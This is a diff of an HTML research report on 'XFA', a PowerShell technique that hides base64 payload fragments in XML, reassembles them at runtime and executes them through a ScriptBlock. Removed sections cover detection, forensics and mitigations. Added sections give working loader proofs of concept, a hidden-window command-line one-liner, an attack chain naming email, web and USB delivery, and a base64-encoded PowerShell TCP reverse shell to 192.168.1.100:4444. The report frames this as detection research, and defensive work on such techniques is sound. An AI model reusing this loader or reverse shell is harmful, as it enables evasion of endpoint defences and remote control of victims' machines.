-    depends on where a particular security product performs inspection.
-</p>
-
-<p>
-    A product that observes only the initial XML representation may have
-    different visibility from a product that correlates the decoded
-    ScriptBlock with the preceding XML processing operations.
-</p>
-
-<h2>10. Forensic Considerations</h2>
-
-<p>
-    Investigators should not limit analysis to the initial XML content.
-    The relevant evidence may exist across multiple telemetry sources.
-</p>
-
-<ul>
-    <li>PowerShell process creation events.</li>
-    <li>PowerShell ScriptBlock logging.</li>
-    <li>AMSI-related telemetry where available.</li>
-    <li>Parent-child process relationships.</li>
-    <li>Command-line parameters.</li>
-    <li>Files or resources containing the XML payload.</li>
-    <li>Network activity generated by the final payload.</li>
-    <li>Endpoint telemetry surrounding dynamic script execution.</li>
-</ul>
-
-<p>
-    Correlating these sources can allow defenders to reconstruct the complete
-    execution chain even when the initial payload representation appears to
-    contain only structured data.
-</p>
-
-<h2>11. MITRE ATT&amp;CK Mapping</h2>
-
-<p>
-    XFA itself is presented as a research name rather than a new MITRE ATT&amp;CK
-    technique. The individual behaviours used by an implementation can map
-    to existing ATT&amp;CK techniques depending on the final payload and
-    operational context.
-</p>
-
-<table>
-    <thead>
-        <tr>
-            <th>Tactic</th>
-            <th>ID</th>
-            <th>Technique</th>
-            <th>Relationship</th>
-        </tr>
-    </thead>
-    <tbody>
-        <tr>
-            <td>Defense Evasion</td>
-            <td>TA0005</td>
-            <td>Obfuscated Files or Information</td>
-            <td>Payload representation may obscure the final executable content.</td>
-        </tr>
-        <tr>
-            <td>Defense Evasion</td>
-            <td>T1027.010</td>
-            <td>Command Obfuscation</td>
-            <td>Applicable when command content is intentionally transformed.</td>
-        </tr>
-        <tr>
-            <td>Execution</td>
-            <td>T1059.001</td>
-            <td>PowerShell</td>
-            <td>The execution chain relies on PowerShell.</td>
-        </tr>
-        <tr>
-            <td>Defense Evasion</td>
-            <td>T1140</td>
-            <td>Deobfuscate/Decode Files or Information</td>
-            <td>The encoded payload is decoded before execution.</td>
-        </tr>
-    </tbody>
-</table>
-
-<h2>12. Comparison With Deserialisation-Based Approaches</h2>
-
-<table>
-    <thead>
-        <tr>
-            <th>Characteristic</th>
-            <th>XFA</th>
-            <th>Deserialisation-Based Approach</th>
-        </tr>
-    </thead>
-    <tbody>
-        <tr>
-            <td>XML processing</td>
-            <td>Native XML parsing</td>
-            <td>PowerShell deserialisation mechanisms</td>
-        </tr>
-        <tr>
-            <td>Payload extraction</td>
-            <td>XML object/property navigation</td>
-            <td>Deserialised object structure</td>
-        </tr>
-        <tr>
-            <td>Deserialisation required</td>
-            <td>No</td>
-            <td>Yes</td>
-        </tr>
-        <tr>
-            <td>Dynamic execution</td>
-            <td>ScriptBlock creation</td>
-            <td>Implementation dependent</td>
-        </tr>
-        <tr>
-            <td>Detection strategy</td>
-            <td>Behavioural correlation</td>
-            <td>Deserialisation and execution telemetry</td>
-        </tr>
-    </tbody>
-</table>
-
-<h2>13. Limitations</h2>
-
-<p>
-    XFA should not be interpreted as a universal EDR or AV bypass. Security
-    products differ substantially in where and how they inspect PowerShell,
-    XML, encoded data, AMSI content, and dynamically generated script.
-</p>
-
-<p>
-    The technique may also generate detectable behavioural signals. In
-    particular, dynamic ScriptBlock creation and subsequent PowerShell
-    execution may remain visible even when the original payload was embedded
-    inside an XML representation.
-</p>
-
-<p>
-    The effectiveness of the method must therefore be established through
-    controlled testing rather than inferred solely from the use of XML or
-    encoded payload data.
-</p>
-
-<h2>14. Mitigation Recommendations</h2>
-
-<ul>
-    <li>
-        Enable PowerShell ScriptBlock logging where operationally appropriate.
-    </li>
-    <li>
-        Monitor suspicious PowerShell processes that perform XML parsing
-        followed by dynamic script execution.
-    </li>
-    <li>
-        Correlate encoded-data processing with subsequent ScriptBlock creation.
-    </li>
-    <li>
-        Maintain AMSI and endpoint security telemetry.
-    </li>
-    <li>
-        Use Constrained Language Mode where appropriate.
-    </li>
-    <li>
-        Apply AppLocker or WDAC according to organizational requirements.
-    </li>
-    <li>
-        Monitor unusual parent-child PowerShell process relationships.
-    </li>
-    <li>
-        Investigate XML files or embedded XML data that are immediately
-        followed by dynamic PowerShell execution.
-    </li>
-</ul>
-
-<h2>15. Recommended Detection Logic</h2>
-
-<p>
-    A practical detection strategy can focus on correlation rather than a
-    single static signature.
-</p>
-
-<pre>
-```
-
-PowerShell process
-│
-├── XML parsing
-│
-├── XML node extraction
-│
-├── encoded-data reconstruction
-│
-├── decoding operation
-│
-└── ScriptBlock creation / invocation
-│
-▼
-Elevated investigation priority </pre>
-
-```
-<p>
-    This approach reduces the probability of generating excessive alerts
-    from ordinary XML parsing while increasing confidence when several
-    behaviours occur within the same process execution chain.
-</p>
-
-<h2>16. Research Significance</h2>
-
-<p>
-    The primary significance of this research is the investigation of a
-    payload-delivery pattern that combines ordinary PowerShell XML processing
-    with dynamic execution without requiring PowerShell deserialisation.
-</p>
-
-<p>
-    The research therefore focuses on the behavioural boundary between
-    <strong>data processing</strong> and <strong>code execution</strong>.
-    XML is initially treated as structured data; after several transformations,
-    the same process converts that data into executable PowerShell.
-</p>
-
-<p>
-    This boundary is relevant to defenders because modern endpoint security
-    increasingly relies on behavioural correlation rather than simple
-    signature matching. A technique that deliberately distributes its
-    execution logic across otherwise legitimate operations can therefore
-    provide a useful case study for detection engineering.
-</p>
-
-<h2>17. Conclusion</h2>
-
-<p>
-    XPath Fragment Assembly (XFA) describes a PowerShell execution pattern
-    in which XML is used as an intermediate representation for executable
-    payload data. The method relies on native XML parsing, XML object
-    navigation, payload reconstruction, decoding, and dynamic
-    <code>ScriptBlock</code> execution.
-</p>
-
-<p>
-    The principal security characteristic is the separation between the
-    initial payload representation and the final executable PowerShell
-    content. Rather than presenting the complete command as a contiguous
-    script, the execution chain reconstructs the required content during
-    runtime.
-</p>
-
-<p>
-    From a defensive standpoint, the technique demonstrates why individual
-    operations such as XML parsing or encoded-data processing should not
-    necessarily be treated as malicious in isolation. Correlation between
-    XML processing, payload reconstruction, decoding, and dynamic execution
-    provides a more meaningful detection strategy.
-</p>
-
-<p>
-    XFA should therefore be regarded as a research technique and detection
-    case study. Further validation against multiple endpoint security
-    products, PowerShell versions, logging configurations, and AMSI
-    implementations would be required to determine its practical
-    defense-evasion effectiveness.
-</p>
-
-<div class="note">
-    <strong>Research conclusion:</strong>
-    The important security property investigated by XFA is not the use of
-    XML or encoded data individually, but the chaining of legitimate
-    PowerShell capabilities into a runtime payload reconstruction and
-    execution workflow.
-</div>
-
-<h2>18. References</h2>
-
-<ul>
-    <li>
-        PowerShell Language Specification – XML and XPath
-    </li>
-    <li>
-        Microsoft PowerShell documentation
-    </li>
-    <li>
-        MITRE ATT&amp;CK – PowerShell (T1059.001)
-    </li>
-    <li>
-        MITRE ATT&amp;CK – Command Obfuscation (T1027.010)
-    </li>
-    <li>
-        MITRE ATT&amp;CK – Deobfuscate/Decode Files or Information (T1140)
-    </li>
-</ul>
-
-<div class="footer">
-    <span>BoxStrike Research · XPath Fragment Assembly (XFA)</span>
-    <span>9 August 2026 · Version 1.5</span>
-</div>
-```
+&amp; ([scriptblock]::Create($command))
+            </div>
+            <p style="font-size:0.9rem; margin-top:8px;">
+                <strong>Note:</strong> This variant uses <code>$xml.Objs.Obj.S</code>
+                which is PowerShell's property traversal, not XPath. It does not invoke
+                CLIXML deserialization.
+            </p>
+        </div>
+
+        <!-- PoC 2 - XML Embedded (Here-String) -->
+        <div class="card">
+            <h4>PoC 2 – XML Embedded (Here-String)</h4>
+            <p><strong>Single file, no disk, no deserialisation</strong></p>
+            <div class="code-block">
+$xmlPayload = @'
+&lt;Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"&gt;
+  &lt;Obj&gt;&lt;TN&gt;&lt;T&gt;System.String&lt;/T&gt;&lt;/TN&gt;
+  &lt;S&gt;QWRkLVR5cGUgLUFzc2VtYmx5TmFtZSBTeXN0ZW0uV2luZG93cy5Gb3JtczsgW&lt;/S&gt;
+  &lt;!-- Additional fragments would be placed here for larger payloads --&gt;
+&lt;/Objs&gt;
+'@
+
+# Parse XML (no deserialisation)
+$xml = [xml]$xmlPayload
+$segments = $xml.Objs.Obj.S
+$combined = $segments -join ''
+$command = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($combined))
+&amp; ([scriptblock]::Create($command))
+            </div>
+            <p style="font-size:0.9rem; margin-top:8px;">
+                <strong>Note:</strong> This method uses no <code>ConvertFrom-CliXml</code> or
+                <code>PSSerializer.Deserialize</code>. It has been tested on PowerShell 5.1
+                and 7.x in the research environment.
+            </p>
+        </div>
+    </div>
+
+    <!-- PoC 3 – PowerShell 7.5 (ConvertFrom-CliXml) - Comparison -->
+    <div class="card-full">
+        <h4>PoC 3 – Comparison: PowerShell 7.5 ConvertFrom-CliXml</h4>
+        <p>
+            This variant uses <strong>ConvertFrom-CliXml</strong> to process the
+            supplied CLIXML-formatted data. Unlike PoC 1 and PoC 2, this variant
+            <strong>explicitly invokes PowerShell's CLIXML deserialization mechanism</strong>.
+        </p>
+        <p>
+            This provides a useful comparison between ordinary XML parsing and
+            CLIXML deserialization. The resulting object type and structure depend
+            on the serialized XML representation; therefore, the PoC should not
+            assume that every CLIXML input is returned as a <code>String[]</code>.
+        </p>
+        <p>
+            Because this variant explicitly invokes deserialization, it represents
+            a different execution path from the XML-parsing variants and should
+            be evaluated separately when analysing telemetry and detection
+            behaviour.
+        </p>
+        <div class="code-block">
+# PoC 3 – PowerShell 7.5 (ConvertFrom-CliXml)
+# XML payload (here-string) – using MessageBox test payload
+$xmlPayload = @'
+&lt;Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"&gt;
+  &lt;Obj&gt;&lt;TN&gt;&lt;T&gt;System.String&lt;/T&gt;&lt;/TN&gt;&lt;S&gt;QWRkLVR5cGUgLUFzc2VtYmx5TmFtZSBTeXN0ZW0uV2luZG93cy5Gb3JtczsgW&lt;/S&gt;&lt;/Obj&gt;
+&lt;/Objs&gt;
+'@
+
+# ConvertFrom-CliXml ile doğrudan string dizisine dönüştür (PowerShell 7.5+)
+$segments = $xmlPayload | ConvertFrom-CliXml
+
+# Birleştir
+$combinedBase64 = $segments -join ''
+
+# Decode et
+$fullCommand = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($combinedBase64))
+
+# Çalıştır
+&amp; ([scriptblock]::Create($fullCommand))
+        </div>
+        <div class="note-box">
+            <strong>Note:</strong> This PoC requires <strong>PowerShell 7.5 or later</strong>
+            because <code>ConvertFrom-CliXml</code> is a cmdlet introduced in that version.
+            It explicitly uses deserialisation, which is a different execution path from
+            PoC 1 and PoC 2.
+        </div>
+    </div>
+
+    <p style="font-size:0.9rem; margin-top:8px;">
+        <strong>One‑liner for CMD (PoC 2):</strong>
+    </p>
+    <div class="code-block" style="font-size:0.75rem;">
+powershell -nop -w hidden -c "$x=[xml]@'&lt;Objs Version=\"1.1.0.1\" xmlns=\"http://schemas.microsoft.com/powershell/2004/04\"&gt;&lt;Obj&gt;&lt;TN&gt;&lt;T&gt;System.String&lt;/T&gt;&lt;/TN&gt;&lt;S&gt;QWRkLVR5cGUgLUFzc2VtYmx5TmFtZSBTeXN0ZW0uV2luZG93cy5Gb3JtczsgW&lt;/S&gt;&lt;/Obj&gt;&lt;/Objs&gt;'@;$s=$x.Objs.Obj.S;$c=$s-join'';$f=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($c));&amp;([scriptblock]::Create($f))"
+    </div>
+
+    <!-- 5. Detection Considerations -->
+    <h2>5. Detection Considerations</h2>
+    <p>
+        The technique demonstrates how several individually legitimate operations
+        can be combined into a single execution chain. This does not imply that
+        these operations are universally undetected. Detection behaviour depends
+        on the EDR/AV product, version, configuration, telemetry sources,
+        PowerShell logging settings, and behavioural analytics in use.
+    </p>
+    <ul>
+        <li>
+            <strong>Encoded content:</strong>
+            Base64 data can conceal the semantics of the underlying command from
+            simple content inspection. However, many EDRs can detect long Base64
+            strings or patterns indicative of encoded commands.
+        </li>
+        <li>
+            <strong>XML parsing:</strong>
+            Loading an XML document with <code>[xml]</code> is a legitimate
+            PowerShell operation and therefore must be distinguished from
+            CLIXML deserialization. Some EDRs may not treat this as suspicious.
+        </li>
+        <li>
+            <strong>Runtime reconstruction:</strong>
+            The encoded content is reconstructed during execution rather than
+            appearing directly as readable command text in the XML container.
+            This may hinder static analysis.
+        </li>
+        <li>
+            <strong>ScriptBlock execution:</strong>
+            Dynamically creating executable PowerShell code using
+            <code>[scriptblock]::Create()</code> introduces a behavioural detection
+            opportunity even when the original payload is encoded.
+        </li>
+    </ul>
+    <p>
+        Consequently, this technique should not be described as a guaranteed EDR bypass.
+        Rather, the research demonstrates a potential visibility gap created by
+        the combination of encoded data, XML parsing, runtime reconstruction,
+        and dynamic PowerShell execution. The actual detection rate will vary
+        depending on the target environment.
+    </p>
+
+    <!-- 6. Memory Data Flow Diagram -->
+    <h2>6. Memory Data Flow Diagram</h2>
+    <div class="diagram">
+        <svg viewBox="0 0 900 340" xmlns="http://www.w3.org/2000/svg">
+            <defs>
+                <marker id="arrowhead" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto">
+                    <polygon points="0 0, 10 3.5, 0 7" fill="#1e4a7a" />
+                </marker>
+                <style>
+                    .box { fill: #ffffff; stroke: #1e4a7a; stroke-width: 2; rx: 12; }
+                    .box-text { fill: #0a1e3c; font-size: 13px; font-weight: 600; font-family: 'Segoe UI', sans-serif; }
+                    .subtext { fill: #2c3e5a; font-size: 11px; font-family: 'Segoe UI', sans-serif; }
+                    .arrow { stroke: #1e4a7a; stroke-width: 2; fill: none; marker-end: url(#arrowhead); }
+                </style>
+            </defs>
+            <!-- XML File -->
+            <rect x="30" y="120" width="160" height="80" class="box" />
+            <text x="110" y="155" text-anchor="middle" class="box-text">payload.xml</text>
+            <text x="110" y="175" text-anchor="middle" class="subtext">(Base64 fragments)</text>
+            <!-- Arrow 1 -->
+            <line x1="190" y1="160" x2="260" y2="160" class="arrow" />
+            <!-- XML Parsing -->
+            <rect x="270" y="100" width="180" height="120" class="box" stroke="#d97706" />
+            <text x="360" y="135" text-anchor="middle" class="box-text">XML Parsing</text>
+            <text x="360" y="155" text-anchor="middle" class="subtext">[xml](Get-Content ...)</text>
+            <text x="360" y="175" text-anchor="middle" class="subtext">Property traversal: $x.Objs.Obj.S</text>
+            <text x="360" y="195" text-anchor="middle" class="subtext">(No Deserialisation)</text>
+            <!-- Arrow 2 -->
+            <line x1="450" y1="160" x2="520" y2="160" class="arrow" />
+            <!-- String Array -->
+            <rect x="530" y="90" width="160" height="140" class="box" stroke="#0b6e4f" />
+            <text x="610" y="120" text-anchor="middle" class="box-text">String[]</text>
+            <text x="610" y="140" text-anchor="middle" class="subtext">Base64 fragments</text>
+            <text x="610" y="160" text-anchor="middle" class="subtext">"QWRkLVR5cGU..."</text>
+            <text x="610" y="180" text-anchor="middle" class="subtext">"gLUFzc2VtYmx..."</text>
+            <text x="610" y="200" text-anchor="middle" class="subtext">...</text>
+            <!-- Arrow 3 -->
+            <line x1="690" y1="160" x2="760" y2="160" class="arrow" />
+            <!-- Assembly + ScriptBlock -->
+            <rect x="770" y="90" width="120" height="140" class="box" stroke="#b13a4b" />
+            <text x="830" y="120" text-anchor="middle" class="box-text">Assemble</text>
+            <text x="830" y="145" text-anchor="middle" class="subtext">Base64 → UTF-8</text>
+            <text x="830" y="165" text-anchor="middle" class="subtext">+ concat</text>
+            <text x="830" y="190" text-anchor="middle" class="box-text">ScriptBlock</text>
+            <text x="830" y="210" text-anchor="middle" class="subtext">&amp; { ... }</text>
+            <!-- Labels -->
+            <text x="225" y="140" font-size="11" fill="#1e4a7a" font-weight="500">1. Read file</text>
+            <text x="485" y="140" font-size="11" fill="#1e4a7a" font-weight="500">2. Extract values</text>
+            <text x="735" y="140" font-size="11" fill="#1e4a7a" font-weight="500">3. Decode + concat</text>
+        </svg>
+        <p style="margin-top:12px; color:#2c3e5a; font-size:0.9rem;">
+            <strong>Figure 1:</strong> Memory data flow in the XFA method. No deserialisation is used
+            in PoC 1 and PoC 2.
+        </p>
+    </div>
+
+    <!-- 7. Attack Chain -->
+    <h2>7. Attack Chain</h2>
+    <div class="diagram">
+        <svg viewBox="0 0 950 200" xmlns="http://www.w3.org/2000/svg">
+            <defs>
+                <marker id="arrow2" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto">
+                    <polygon points="0 0, 10 3.5, 0 7" fill="#1e4a7a" />
+                </marker>
+                <style>
+                    .chain-box { fill: #ffffff; stroke: #1e4a7a; stroke-width: 2; rx: 12; }
+                    .chain-text { fill: #0a1e3c; font-size: 12px; font-weight: 600; font-family: 'Segoe UI', sans-serif; }
+                    .chain-sub { fill: #2c3e5a; font-size: 10px; font-family: 'Segoe UI', sans-serif; }
+                    .arrow-chain { stroke: #1e4a7a; stroke-width: 2; fill: none; marker-end: url(#arrow2); }
+                </style>
+            </defs>
+            <!-- Stage 1 -->
+            <rect x="10" y="50" width="150" height="100" class="chain-box" />
+            <text x="85" y="80" text-anchor="middle" class="chain-text">Preparation</text>
+            <text x="85" y="100" text-anchor="middle" class="chain-sub">Payload creation</text>
+            <text x="85" y="118" text-anchor="middle" class="chain-sub">Base64 encoding</text>
+            <text x="85" y="136" text-anchor="middle" class="chain-sub">Fragmentation</text>
+            <!-- Arrow -->
+            <line x1="160" y1="100" x2="200" y2="100" class="arrow-chain" />
+            <!-- Stage 2 -->
+            <rect x="210" y="50" width="150" height="100" class="chain-box" stroke="#d97706" />
+            <text x="285" y="80" text-anchor="middle" class="chain-text">Delivery</text>
+            <text x="285" y="100" text-anchor="middle" class="chain-sub">XML file</text>
+            <text x="285" y="118" text-anchor="middle" class="chain-sub">(email, web, USB)</text>
+            <text x="285" y="136" text-anchor="middle" class="chain-sub">Deliver to target</text>
+            <!-- Arrow -->
+            <line x1="360" y1="100" x2="400" y2="100" class="arrow-chain" />
+            <!-- Stage 3 -->
+            <rect x="410" y="50" width="150" height="100" class="chain-box" stroke="#0b6e4f" />
+            <text x="485" y="80" text-anchor="middle" class="chain-text">Parsing</text>
+            <text x="485" y="100" text-anchor="middle" class="chain-sub">[xml] parsing</text>
+            <text x="485" y="118" text-anchor="middle" class="chain-sub">No deserialisation</text>
+            <text x="485" y="136" text-anchor="middle" class="chain-sub">String[] created</text>
+            <!-- Arrow -->
+            <line x1="560" y1="100" x2="600" y2="100" class="arrow-chain" />
+            <!-- Stage 4 -->
+            <rect x="610" y="50" width="150" height="100" class="chain-box" stroke="#b13a4b" />
+            <text x="685" y="80" text-anchor="middle" class="chain-text">Assembly</text>
+            <text x="685" y="100" text-anchor="middle" class="chain-sub">Base64 decoding</text>
+            <text x="685" y="118" text-anchor="middle" class="chain-sub">String concatenation</text>
+            <text x="685" y="136" text-anchor="middle" class="chain-sub">ScriptBlock creation</text>
+            <!-- Arrow -->
+            <line x1="760" y1="100" x2="800" y2="100" class="arrow-chain" />
+            <!-- Stage 5 -->
+            <rect x="810" y="50" width="120" height="100" class="chain-box" stroke="#1e4a7a" fill="#e9edf6" />
+            <text x="870" y="80" text-anchor="middle" class="chain-text">Execution</text>
+            <text x="870" y="100" text-anchor="middle" class="chain-sub">&amp; ScriptBlock</text>
+            <text x="870" y="118" text-anchor="middle" class="chain-sub">Payload execution</text>
+            <text x="870" y="136" text-anchor="middle" class="chain-sub">(MessageBox / shell)</text>
+            <!-- Caption -->
+            <text x="475" y="185" text-anchor="middle" font-size="11" fill="#1e3a5f" font-weight="500">
+                Diagram represents the execution flow — detection depends on product, config, and telemetry
+            </text>
+        </svg>
+        <p style="margin-top:12px; color:#2c3e5a; font-size:0.9rem;">
+            <strong>Figure 2:</strong> Conceptual XFA execution chain. The chain begins
+            with preparation of encoded data, followed by delivery and XML parsing.
+            The embedded data is subsequently reconstructed and decoded before the
+            resulting PowerShell content is passed to a dynamically created
+            <code>ScriptBlock</code>.
+        </p>
+        <p style="font-size:0.9rem; color:#2c3e5a;">
+            The diagram represents the execution flow demonstrated by the PoC and
+            should not be interpreted as evidence that the first stages are
+            universally invisible to EDR/AV products. Detection outcomes will vary.
+        </p>
+    </div>
+
+    <!-- 8. Conclusion -->
+    <h2>8. Conclusion</h2>
+    <p>
+        The XML Fragment Assembly (XFA) research demonstrates how encoded data
+        can be embedded within an XML structure and reconstructed during
+        PowerShell execution without invoking CLIXML deserialization in the
+        primary PoC variants.
+    </p>
+    <p>
+        The key observation is the distinction between ordinary XML parsing and
+        PowerShell's CLIXML deserialization mechanism. The PoC shows that a
+        CLIXML-like XML structure can be treated simply as XML data, allowing
+        embedded values to be extracted, concatenated, decoded, and subsequently
+        processed as PowerShell code.
+    </p>
+    <p>
+        This research does not establish that the technique universally bypasses
+        EDR/AV products. Instead, it identifies a potentially relevant behavioural
+        pattern that security products can monitor: encoded content stored in XML,
+        runtime reconstruction, Base64 decoding, and subsequent dynamic
+        PowerShell execution. The actual detection rate will depend on the
+        specific EDR/AV product, version, configuration, and telemetry sources
+        in use.
+    </p>
+    <p>
+        BoxStrike publishes this research to document the technique and encourage
+        further investigation into behavioural detection strategies capable of
+        correlating these individual operations into a single execution chain.
+    </p>
+
+    <!-- Appendix: Reverse Shell Variant -->
+    <h2>Appendix: Reverse Shell Payload Variant</h2>
+    <p>
+        The same mechanism works with a reverse shell payload. For reference, the
+        Base64-encoded reverse shell command used in testing is:
+    </p>
+    <div class="code-block" style="font-size:0.75rem;">
+JGNsaWVudCA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5Tb2NrZXRzLlRDUENsaWVudCgnMTkyLjE2OC4xLjEwMCcsNDQ0NCk7CiRzdHJlYW0gPSAkY2xpZW50LkdldFN0cmVhbSgpOwpbYnl0ZVtdXSRieXRlcyA9IDAuLjY1NTM1fCV7MH07CndoaWxlKCgkaSA9ICRzdHJlYW0uUmVhZCgkYnl0ZXMsIDAsICRieXRlcy5MZW5ndGgpKSAtbmUgMCl7CiAgICAkZGF0YSA9IChOZXctT2JqZWN0IC1UeXBlTmFtZSBTeXN0ZW0uVGV4dC5BU0NJSUVuY29kaW5nKS5HZXRTdHJpbmcoJGJ5dGVzLDAsICRpKTsKICAgICRzZW5kYmFjayA9IChpZXggJGRhdGEgMj4mMSB8IE91dC1TdHJpbmcgKTsKICAgICRzZW5kYmFjazIgPSAkc2VuZGJhY2sgKyAnUFMgJyArIChwd2QpLlBhdGggKyAnPiAnOwogICAgJHNlbmRieXRlID0gKFt0ZXh0LmVuY29kaW5nXTo6QVNDSUkpLkdldEJ5dGVzKCRzZW5kYmFjazIpOwogICAgJHN0cmVhbS5Xcml0ZSgkc2VuZGJ5dGUsMCwkc2VuZGJ5dGUuTGVuZ3RoKTsKICAgICRzdHJlYW0uRmx1c2goKQp9OwokY2xpZW50LkNsb3NlKCk=
+    </div>
+    <p>
+        This Base64 string decodes to a standard PowerShell TCP reverse shell targeting
+        <code>192.168.1.100:4444</code>. The same fragment assembly technique can be
+        used to deliver this payload.
+    </p>
+    <div class="warning-box" style="background:#fce9ec; border-left:5px solid #b13a4b; padding:14px 20px; margin:18px 0; border-radius:0 4px 4px 0;">
+        <strong>Security Warning:</strong> The reverse shell payload is provided for
+        research and defensive testing only. Unauthorised use is illegal and strictly
+        prohibited. The authors assume no liability for any misuse.
+    </div>
+
+    <!-- 9. Signature -->
+    <div class="signature">
+        <p>
+            Sincerely,<br>
+            <strong>BoxStrike Team</strong><br>
+            Ensan Erdoğan Karaca<br>
+            <span style="font-size:0.9rem; color:#2c3e5a;">7 August 2026</span>
+        </p>
+    </div>
+
+    <!-- Footer -->
+    <div style="margin-top:40px; padding-top:20px; border-top:1px solid #dce3ef; font-size:0.8rem; color:#5a6d86; text-align:center;">
+        &copy; 2026 BoxStrike Research – XML Fragment Assembly (XFA) – All rights reserved.<br>
+        This report is for educational and awareness purposes only. Unauthorised use is prohibited.
+    </div>
 
 </div>
 </body>
